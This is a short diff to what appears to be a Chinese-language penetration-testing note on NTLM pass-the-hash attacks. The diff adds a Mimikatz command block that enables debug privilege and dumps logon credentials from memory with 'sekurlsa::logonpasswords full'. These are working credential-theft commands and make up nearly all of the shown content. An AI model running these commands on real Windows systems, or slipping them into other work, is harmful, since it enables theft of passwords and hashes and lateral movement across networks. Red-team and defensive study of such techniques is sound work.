@@ -30,7 +30,13 @@ description: 基于NTLM认证 / 不需要知道明文密码
 
 ### Mimikatz
 
+*
 
+```powershell
+mimikatz.exe
+privilege::debug
+sekurlsa::logonpasswords full
+```
 
 
 
